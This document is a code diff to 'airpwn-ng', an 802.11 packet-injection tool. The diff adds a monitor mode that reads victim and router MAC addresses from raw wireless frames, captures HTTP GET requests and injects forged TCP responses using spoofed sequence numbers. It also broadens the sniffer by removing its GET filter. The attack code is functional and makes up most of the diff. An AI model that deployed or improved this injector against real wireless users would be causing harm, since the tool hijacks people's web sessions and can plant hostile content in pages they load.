@@ -71,7 +71,9 @@ global TARGETED
 global HITCOUNTER
 global mac_list
 global EXCLUSION
+global MONITOR
 global EXCLUDE_LIST
+MONITOR=0
 EXCLUSION=0
 EXCLUDE_LIST=[]
 mac_list=[]
@@ -248,6 +250,13 @@ def GET_print(packet):
 		if packet.haslayer(IP):
 			proc_packet(packet)
 
+
+def expand(x):
+    yield x
+    while x.payload:
+        x = x.payload
+        yield x
+
 #
 # Does some processing to check if the packet is a GET request. If so, grabs packet info and injects the payload
 #
@@ -255,6 +264,7 @@ def http_header(packet):
         http_packet=str(packet)
 	global EXCLUSION
 	global TARGETED
+	global MONITOR
 	global EXCLUDE_LIST
 	if (EXCLUSION==1):
 		try:
@@ -278,20 +288,14 @@ def http_header(packet):
 
 	else:
 		pass
-
 	#TODO: Improve this check and implement --covert mode with stricter checks
         if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html")) ):
-		if (packet.haslayer(IP) and packet.haslayer(Ether)):
-			process=0
-			if (TARGETED):
-				for m_mac in mac_list:
-					if (packet.getlayer(Ether).src.lower()==m_mac.lower()):
-						process=1
-			else:
-				process=1
-			if (process==1):
-				vicmac=packet.getlayer(Ether).src
-				rtrmac=packet.getlayer(Ether).dst
+		#MONITOR MODE:
+		if (MONITOR):
+			if (packet.haslayer(IP) and "GET" in "\n".join(packet.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))):
+#				print list(expand(packet))
+				vicmac=packet.getlayer(Dot11).addr2
+				rtrmac=packet.getlayer(Dot11).addr1
 				vicip=packet.getlayer(IP).src
 				svrip=packet.getlayer(IP).dst
 				vicport=packet.getlayer(TCP).sport
@@ -304,6 +308,32 @@ def http_header(packet):
 				seqnum=packet.getlayer(TCP).ack
 				start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
 
+		else:
+			if (packet.haslayer(IP)):
+#			ls(packet)
+#			return
+				process=0
+				if (TARGETED):
+					for m_mac in mac_list:
+						if (packet.getlayer(Ether).src.lower()==m_mac.lower()):
+							process=1
+				else:
+					process=1
+				if (process==1):
+					vicmac=packet.getlayer(Ether).src
+					rtrmac=packet.getlayer(Ether).dst
+					vicip=packet.getlayer(IP).src
+					svrip=packet.getlayer(IP).dst
+					vicport=packet.getlayer(TCP).sport
+					svrport=packet.getlayer(TCP).dport
+					try:
+						size=len(packet.getlayer(TCP).load)
+					except:
+						size=20
+					acknum=str(int(packet.getlayer(TCP).seq)+size)
+					seqnum=packet.getlayer(TCP).ack
+					start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
+	
 #
 # Packet injection for targeted mode, only injects if the MAC address is present in mac_list, as defined by -t
 #
@@ -353,9 +383,10 @@ def process_targeted_packet(packet):
 # Sets up the sniffer thread using stryngs' tcpdump filter
 #
 def threaded_sniff_target(q):
-  global m_finished
-  sniff(iface = m_iface,filter = 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420', prn = lambda x : q.put(x))
-  m_finished = True
+#  global m_finished
+#  sniff(iface = m_iface,filter = 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420', prn = lambda x : q.put(x))
+  sniff(iface = m_iface, prn = lambda x : q.put(x))
+#  m_finished = True
 
 #
 # Sniff in broadcast mode
@@ -489,15 +520,19 @@ def main(args):
 	print "\n\nairpwn-ng - the new and improved 802.11 packet injector\n\n"
 
 	global m_iface
-	m_iface = args.m
+	global MONITOR
 	global i_iface
-	i_iface = args.i
 	global injection
 	global websites
 	global HITCOUNTER_STATIC
 	global HITCOUNTER
 	global EXCLUSION
 	global EXCLUDE_LIST
+
+	if ("mon" in args.m):
+		MONITOR=1
+	m_iface = args.m
+	i_iface = args.i
 
 	#CHECK FOR COOKIE COUNT
 	if (args.c is not None):
